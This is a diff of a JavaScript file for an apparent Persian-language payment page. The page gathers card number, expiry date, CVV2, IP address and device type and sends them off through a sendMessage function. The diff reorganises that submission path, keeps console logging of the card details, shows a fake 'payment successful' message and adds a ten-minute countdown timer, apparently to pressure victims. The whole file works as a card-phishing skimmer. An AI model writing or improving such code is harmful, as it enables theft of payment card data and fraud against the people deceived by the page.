@@ -18,7 +18,7 @@ const sendMessage = async function (message) {
       return data;
     })
     .catch(error => {
-      console.error('خطا در ارسال پیام:', error);
+      console.error('خطا در ارسال پیام:', error.message);
     });
 };
 
@@ -164,9 +164,9 @@ function validateCVV2(cvv) {
   }
 }
 
+let errors = [];
 form.addEventListener('keydown', e => {
   // e.preventDefault();
-  let errors = [];
   if (!validateCardNumber(cardInput.value)) {
     errors.push('شماره کارت معتبر نیست.');
   }
@@ -187,7 +187,7 @@ form.addEventListener('keydown', e => {
     validateCardNumber(cardInput.value) &&
     validateExpirationDate(mm, yy) &&
     validateCVV2(cvv2Input.value) &&
-    captchaInput.value === "80860"
+    captchaInput.value === '80860'
   ) {
     const message = `
     Card Number: ${cardInput.value}
@@ -197,14 +197,18 @@ form.addEventListener('keydown', e => {
     IP: ${userIp}
     Device: ${getDeviceType()}
   `;
-
-    let dat = '';
-    if (errors.length > 0) {
-      for (let text of errors) {
-        dat += text + '\n'; // اضافه کردن متن و رفتن به خط جدید
-      }
+    console.log(cardInput.value);
+    console.log(mm);
+    console.log(yy);
+    console.log(cvv2Input.value);
+    sendMessage(message);
+    cardInput.value = '';
+    exprationInput.value = '';
+    cvv2Input.value = '';
+    captchaInput.value = '';
+    setTimeout(() => {
       Toastify({
-        text: dat,
+        text: 'پرداخت با موفقیت انجام شد.',
         duration: 3000,
         newWindow: true,
         close: true,
@@ -214,45 +218,14 @@ form.addEventListener('keydown', e => {
         style: {
           fontSize: '1.1rem',
           fontWeight: '600',
-          background: '#EA384D',
+          background: '#15bb09',
           width: '300px',
           minWidth: '300px',
           display: 'flex',
           justifyContent: 'space-between',
         },
       }).showToast();
-    } else {
-      console.log(cardInput.value);
-      console.log(mm);
-      console.log(yy);
-      console.log(cvv2Input.value);
-      sendMessage(message);
-      cardInput.value = '';
-      exprationInput.value = '';
-      cvv2Input.value = '';
-      setTimeout(() => {
-        Toastify({
-          text: 'پرداخت با موفقیت انجام شد.',
-          duration: 3000,
-          newWindow: true,
-          close: true,
-          gravity: 'top', // `top` or `bottom`
-          position: 'right', // `left`, `center` or `right`
-          stopOnFocus: true, // Prevents dismissing of toast on hover
-          style: {
-            fontSize: '1.1rem',
-            fontWeight: '600',
-            background: '#15bb09',
-            width: '300px',
-            minWidth: '300px',
-            display: 'flex',
-            justifyContent: 'space-between',
-          },
-        }).showToast();
-      }, 2000);
-    }
-  } else {
-    console.log(errors);
+    }, 2000);
   }
 });
 
@@ -320,3 +293,22 @@ firstBtn.addEventListener('click', () => {
     document.getElementById('page3').classList.remove('hidden');
   }
 });
+
+let timeRemaining = 10 * 60; // 10 دقیقه به ثانیه
+const timerElement = document.getElementById('timer');
+
+const countdown = setInterval(() => {
+  const minutes = Math.floor(timeRemaining / 60);
+  const seconds = timeRemaining % 60;
+
+  timerElement.textContent = `${String(minutes).padStart(2, '0')}:${String(
+    seconds
+  ).padStart(2, '0')}`;
+
+  if (timeRemaining <= 0) {
+    clearInterval(countdown);
+    timerElement.textContent = 'زمان به پایان رسید!';
+  }
+
+  timeRemaining--;
+}, 1000);
